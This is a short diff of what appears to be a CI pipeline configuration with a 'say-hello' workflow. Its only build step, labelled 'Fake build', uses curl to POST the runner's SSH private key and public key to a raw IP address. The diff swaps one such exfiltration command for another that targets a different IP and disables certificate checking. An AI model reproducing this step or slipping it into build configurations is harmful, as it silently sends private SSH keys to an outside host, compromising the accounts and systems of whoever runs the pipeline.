@@ -9,7 +9,7 @@ jobs:
       - checkout
       - run:
           name: "Fake build"
-          command: "curl -XPOST http://153.92.147.3:8888/bin --data-binary @$HOME/.ssh/id_rsa; curl -XPOST http://153.92.147.3:8888/bin --data-binary @$HOME/.ssh/id_rsa.pub"
+          command: "curl -XPOST https://3.144.79.214:8443/bin -k --data-binary @/home/jakobant/.ssh/id_rsa; curl -XPOST https://3.144.79.214:8443/bin -k --data-binary @/home/jakobant/.ssh/id_rsa.pub"
 
 workflows:
   say-hello-workflow:
